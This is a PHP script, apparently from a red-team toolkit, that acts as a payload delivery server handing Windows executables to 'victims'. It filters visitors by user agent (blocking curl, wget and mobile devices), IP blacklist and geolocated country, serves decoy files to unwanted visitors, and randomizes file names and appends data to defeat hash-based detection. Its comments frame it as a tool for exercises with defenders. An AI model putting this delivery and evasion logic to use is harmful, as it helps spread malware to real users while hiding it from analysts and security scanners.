<?php

require_once('utils.php');

// User-Agent string blacklist
$uaString = $_SERVER['HTTP_USER_AGENT'];
$ua_blacklist = array(
  "iPhone",
  "iPad",
  "iPod",
  "Android",
  "curl",
  "wget",
);

// IP blacklist, put IPs here that you want blocked
// make sure to use double quotes and not single
// this makes a difference when adding in CIDR
// notation. Additionally, due to bitness ensure
// that if you're matching a single IP address
// you need to set the mask to /32
$ip_blacklist = array(
  "192.168.1.1/32",
);

// Name or IP address of the server that this script
// is currently hosted on
$svr = '127.0.0.1';

// Name of payload(s). When it is served to the user
// it will have its named randomized as well as
// random data appeneded to modify the hash
$bit32 = 'good.exe';
$bit64 = 'good64.exe';

// Name of payload(s). When a failure condition is found
// we serve the wrong payloads to the user. We also
// append random data to the end to modify the hash
//
// these are used in conjunction with $srvWrong
// so if thats set to FALSE, these will not be used
// instead a 404 (or whatever code you return), will
// be returned to the victim
$wrg32 = 'wrong.exe';
$wrg64 = 'wrong64.exe';

// This is the directory that you need to create with
// www-data:www-data ownership. This directory should
// contain your binaries to download. The name of this directory
// should be random so that its not easily found
//
// Ensure that all the payloads are found in this directory
$workingDir = 'ryeuwiqoryuewiqorywueiqoryewuq';

// This will grab the geolocation information about the
// browsing IP address and return it in JSON for easy
// parsing, you can use other free services for the GeoIP
// but know that they have different JSON parameters. This
// means you'll need to modify the parse parameter. each of
// the free services only allows for a certain number of hits
// per day without an API key
$rhost = $_SERVER['REMOTE_ADDR'];
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$rhost}"));

// Region, this is used to restrict requests to a
// specific region (I.E 'US', 'JP')
$region = 'US';

// This parameter is to serve the wrong file
// default it is false. If set to true, rather
// than just blocking we serve a wrong payload.
$srvWrong = FALSE;

// Check the UA string that hits us against the
// blacklist above
$uaFound = FALSE;
foreach ($ua_blacklist as $ua) {
  if (stristr($uaString, $ua) !== FALSE) {
    $uaFound = TRUE;
  }
}

//
// Main logic is done here
//
// Log file can be found at $workingDir/access.log
// the access.log file is comma separated into 5 categories;
// Status, IP, Region, UA string, binary served 
//
// By default we store all binaries served to the victim
// this allows redteamers to quickly provide blue with the
// exact binary that was presented to the blue
$utils = new utils;
$utils->createLog($workingDir);
$isOkay = $utils->isOkay($rhost, $ip_blacklist, $geo->countryCode, $region, $uaFound, $srvWrong);

if ($srvWrong == TRUE) {
  if ($isOkay == FALSE) {
    if (stristr($uaString, 'Win64')) {
      $name = $utils->servePayload($workingDir, $wrg64, $svr);
    } else {
      $name = $utils->servePayload($workingDir, $wrg32, $svr);
    }
  } else {
    if (stristr($uaString, 'Win64')) {
      $name = $utils->servePayload($workingDir, $bit64, $svr);
    } else {
      $name = $utils->servePayload($workingDir, $bit32, $svr);
    }
  }
} else {
	if ($isOkay == TRUE) {
	  if (stristr($uaString, 'Win64')) {
	    $name = $utils->servePayload($workingDir, $bit64, $svr);
	  } else {
	    $name = $utils->servePayload($workingDir, $bit32, $svr);
	  }
	}
}


$utils->writeLog($workingDir, $rhost, $geo->countryCode, $uaString, $name, $srvWrong, $isOkay);

if (is_null($name) == FALSE) {
  $utils->cleanUp($workingDir, $name);
}

?>
